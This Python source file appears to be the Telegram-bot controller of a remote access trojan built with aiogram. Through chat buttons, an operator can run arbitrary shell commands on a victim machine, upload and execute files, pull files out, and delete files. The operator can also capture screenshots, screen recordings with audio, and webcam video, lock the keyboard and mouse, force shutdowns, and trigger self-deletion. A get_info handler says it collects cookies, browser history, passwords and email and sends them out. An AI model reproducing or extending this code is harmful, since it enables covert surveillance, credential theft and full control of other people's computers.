import main_bots.main as main
import os
import asyncio
import config
import shutil
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State
from aiogram.filters import StateFilter
from aiogram.filters import Command, CommandStart
from aiogram import Router, F, Bot
from aiogram.types import Message, CallbackQuery
import main_bots.keyboard1 as kb
from aiogram.types import BufferedInputFile

router = Router()
bot = Bot(config.TOKEN)

console = main.ConsoleManager()

class Check(StatesGroup):
    url = State()
    file = State()
    msg = State()
    com = State()

async def send_files(message: Message, path, delete=True):
    """SEND FILE TO TELEGRAM"""
    try:
        if os.path.isdir(path):#if dir
            archive_path = f"{path}.zip"
            shutil.make_archive(archive_path[:-4], 'zip', path)

            with open(archive_path, 'rb') as archive_file:
                archive_data = archive_file.read()
            archive = BufferedInputFile(archive_data, filename=os.path.basename(archive_path))
            await message.bot.send_document(message.chat.id, archive, caption="Here is your archived folder.")

            os.remove(archive_path)
        else:#if file
            with open(path, 'rb') as file:
                file_data = file.read()
            file_input = BufferedInputFile(file_data, filename=os.path.basename(path))
            await message.bot.send_document(message.chat.id, file_input, caption="Your file")
    
    except Exception as e:
        await message.answer(f"Error: {str(e)}")
    
    finally:
        if delete and os.path.exists(path):
            os.remove(path)

async def upload_files(message: Message, document):
    """UPLOAD FILE TO SYSTEM FROM TELEGRAM"""
    file_path = os.path.join(console.current_dir, document.file_name)

    file = await message.bot.get_file(document.file_id)
    await message.bot.download_file(file.file_path, file_path)

    await message.answer(f"File `{document.file_name}` saved to `{console.current_dir}`", parse_mode="Markdown")


@router.message(CommandStart())
async def start(message: Message):
    await message.answer('Hes runing :>', reply_markup=kb.main)

@router.message(F.text == 'Deactivated')
async def start(message: Message):
    await message.answer('Hes delete')
    await main.self_delete()

@router.message(F.text == 'Function')
async def start(message: Message):
    await message.answer('Select option', reply_markup=kb.start_create_bot)


@router.callback_query(F.data == 'browser')
async def open_browser(callback: CallbackQuery, state: FSMContext):
    """OPEN PAGE IN BROWSER, CUSTOM URL"""
    await state.set_state(Check.url)
    await callback.answer('Enter url')

@router.message(Check.url)
async def open_browser_process(message: Message, state: FSMContext):
    await state.update_data(url=message.text)

    data = await state.get_data()
    link = data.get('url')
    await main.open_link(link)
    await message.answer('Hes open')

    await state.clear()


@router.callback_query(F.data == 'block')
async def open_browser(callback: CallbackQuery, state: FSMContext):
    """BLOCK KEYB AND MOUSE"""
    await callback.answer('Hes blocked')
    await main.block_input(True)

@router.callback_query(F.data == 'unblock')
async def open_browser(callback: CallbackQuery, state: FSMContext):
    """UNBLOCK KEYB AND MOUSE"""
    await callback.answer('Hes unblocked')
    await main.unblock()


@router.callback_query(F.data == 'load')
async def play_mod(callback: CallbackQuery, state: FSMContext):
    """THIS FUNC LOAD FILE FROM TELEGRAM AND RUN(exe, txt, audio, video) AND MORE"""
    await callback.answer('Enter file')
    await state.set_state(Check.file)

@router.message(Check.file)
async def play_mod_process(message: Message, state: FSMContext):
    file = message.audio or message.voice or message.video or message.document

    if not file:
        await message.reply("Error file")
        return

    file_id = file.file_id
    file_info = await bot.get_file(file_id) 
    file_extension = file.file_name.split(".")[-1] if hasattr(file, "file_name") else "tmp"
    
    file_path = os.path.join(os.getcwd(), f"{file_id}.{file_extension}")
    await bot.download_file(file_info.file_path, destination=file_path)  
    
    await message.reply(f"File hes saved: {file_path}")

    await main.play_and_delete(file_path) 

    await state.clear()


@router.message(F.text == 'Fun')
async def fun_menu(message: Message):
    await message.answer('Fun :)', reply_markup=kb.fun_kb)

@router.callback_query(F.data == 'desktop')
async def change_wallper(callback: CallbackQuery, state: FSMContext):
    """THIS FUNC CHANGE DESKTOP xD"""
    await callback.answer('Enter file')
    await state.set_state(Check.file)

@router.message(Check.file)
async def change_wallper_process(message: Message, state: FSMContext):
    file = message.audio or message.voice or message.video or message.document

    if not file:
        await message.reply("Error file")
        return

    file_id = file.file_id
    file_info = await bot.get_file(file_id) 
    file_extension = file.file_name.split(".")[-1] if hasattr(file, "file_name") else "tmp"
    
    file_path = os.path.join(os.getcwd(), f"{file_id}.{file_extension}")
    await bot.download_file(file_info.file_path, destination=file_path)  
    
    await message.reply(f"File hes saved: {file_path}")

    try:
        wallper = await main.set_wallpaper(file_path)
        await message.answer(wallper)
    finally:
        await main.delete_file(file_path)

    await state.clear()


@router.callback_query(F.data == 'screen')
async def screen(callback: CallbackQuery):
    """SCREENSHOT DISPLAY AND SEND TO TELEGRAM"""
    await callback.answer('Screenshot')
    photo_path = await main.take_screenshot()
    await send_files(callback.message, photo_path)

@router.callback_query(F.data == 'video')
async def screen_video(callback: CallbackQuery):
    """VIDEO DISPLAY AND SEND TO TELEGRAM"""
    await callback.answer('Video')
    video_filename, audio_filename = await main.record_screen_and_audio(100)#video in sec

    await callback.message.answer(video_filename)
    await callback.message.answer(audio_filename)

    await send_files(callback.message, video_filename)
    await send_files(callback.message, audio_filename)

@router.callback_query(F.data == 'wbc')
async def screen_web(callback: CallbackQuery):
    """VIDEO FROM WEB CAMERA AND SEND TO TELEGRAM"""
    await callback.answer('Web cam')
    web_path = await main.record_video(100)#video in sec

    await callback.message.answer(web_path)

    await send_files(callback.message, web_path)




@router.callback_query(F.data == 'off')
async def off(callback: CallbackQuery):
    await callback.answer('Hes off')
    await main.shutdowm()

@router.callback_query(F.data == 'reboot')
async def reboot(callback: CallbackQuery):
    await callback.answer('Hes reboot')
    await main.shutdowm(True)



@router.callback_query(F.data == 'console')
async def console_mod(callback: CallbackQuery, state: FSMContext):
    """REAL CONSOLE"""
    """this is a fucking copy of the telegram console"""
    await state.set_state(Check.com)
    await callback.answer('Console mod')
    await callback.message.answer(f'You in: {console.current_dir}\nEnter a commands:')

@router.message(Check.com)
async def console_mod_process(message: Message, state: FSMContext):
    list_com = ['off console - /stop', '/download (name_file)', '/delete (name_file)', '/run (name_file)', 'Upload file - drop file here', 'back', 'forward']
    input_files = message.document or message.audio or message.video or message.photo

    if input_files:
        await upload_files(message, input_files)
    else:
        command = message.text.strip()
        if command.startswith('/stop'):
            await state.clear()
            await message.answer('Console off')

        else:

            if command.startswith("/download "):
                filename_d= command.split(" ", 1)[1]
                file_path_d = console.get_file_path(filename_d)

                if file_path_d:
                    await send_files(message, file_path_d, delete=False)
                    await message.answer(f'File {filename_d} succeful download')
                else:
                    await message.answer(f"File '{filename_d}' not found in {console.current_dir}")

            elif command.startswith('/delete '):
                filename_r = command.split(" ", 1)[1]
                file_path_r = console.get_file_path(filename_r)

                if file_path_r:
                    await main.delete_file(file_path_r)
                    await message.answer(f'File {filename_r} succeful deleted')
                else:
                    await message.answer(f"File '{filename_r}' not found in {console.current_dir}")

            elif command.startswith('/run '):
                filename_g = command.split(" ", 1)[1]
                file_path_g = console.get_file_path(filename_g)

                if file_path_g:
                    await main.play_and_delete(file_path_g)
                    await message.answer(f'File {filename_g} hes runned')
                else:
                    await message.answer(f"File '{filename_g}' not found in {console.current_dir}")

            else:
                result = console.execute_command(command)
                await message.answer(f'Command answer\nResult command:\n```{result}```', parse_mode="Markdown")
                for i in list_com:
                    await message.answer(i)



@router.callback_query(F.data == 'get_info')
async def get_all_info(callback: CallbackQuery):
    """GET INFO A PC AND COLLECTS ALL COOKI, HISTORY, PASS and EMAIL"""
    info = await main.get_info()
    await callback.answer(info)
    await send_files(callback.message, 'system_info.json')
    #сорян вырезал тут кое что)